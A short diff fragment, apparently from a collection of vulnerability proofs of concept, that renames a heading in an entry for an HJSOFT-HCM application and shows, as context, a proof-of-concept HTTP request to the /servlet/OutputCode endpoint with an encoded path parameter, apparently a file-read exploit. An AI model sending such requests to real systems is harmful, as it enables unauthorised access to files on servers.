@@ -10,7 +10,7 @@ app="HJSOFT-HCM"
 
 
 
-## poc
+## POC
 
 ```
 GET /servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B HTTP/1.1
